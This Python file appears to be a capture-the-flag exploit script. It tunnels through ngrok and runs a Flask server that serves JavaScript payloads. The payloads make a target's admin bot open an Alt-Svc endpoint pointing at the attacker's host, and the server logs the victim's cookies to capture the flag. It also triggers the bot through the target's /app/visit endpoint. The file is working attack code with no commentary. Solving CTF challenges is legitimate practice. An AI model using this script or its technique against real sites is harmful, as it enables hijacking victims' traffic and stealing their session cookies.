import requests
import os
import ngrok
from flask import Flask, request, redirect

DOMAIN = os.getenv("DOMAIN") or "192-168-0-90.traefik.me"

http2_listener = ngrok.forward("caddy:443", "tcp", authtoken_from_env=True)
http2_host = http2_listener.url().replace("tcp://", "")
print(f"HTTP/2 listening on {http2_host}")

http1_listener = ngrok.forward("localhost:80", "tcp", authtoken_from_env=True)
http1_host = http1_listener.url().replace("tcp://", "")
print(f"HTTP/1 listening on {http1_host}")

app = Flask(__name__)

@app.route("/start")
def start():
    exploit = f"""<script>
    (async () => {{
        const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
        let win = window.open("https://{DOMAIN}/app/alt-svc?host={http2_host}");
        while (true) {{
            await sleep(1000);
            win.location.href = "https://{DOMAIN}/app/alt-svc?host={http2_host}&random=" + Math.random();
        }}
    }})();
    </script>"""
    return exploit, 200, {"Content-Type": "text/html"}

@app.route("/start2")
def start2():
    exploit = f"""<script>
    (async () => {{
        const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
        let win = window.open("https://{DOMAIN}/app/alt-svc?host={http2_host}");
        await sleep(1000);
        win.close();
        location.href = "https://{DOMAIN}/flag/";
    }})();
    </script>"""
    return exploit, 200, {"Content-Type": "text/html"}

@app.route("/app/alt-svc")
def alt_svc():
    print(request.cookies)
    return redirect(f"https://{DOMAIN}/flag/")

@app.route("/flag/")
def flag():
    print(request.cookies)
    return "ok"

print(requests.post(f"https://{DOMAIN}/app/visit", data={"url": f"http://{http1_host}/start"}).json())

app.run(host="0.0.0.0", port=80)
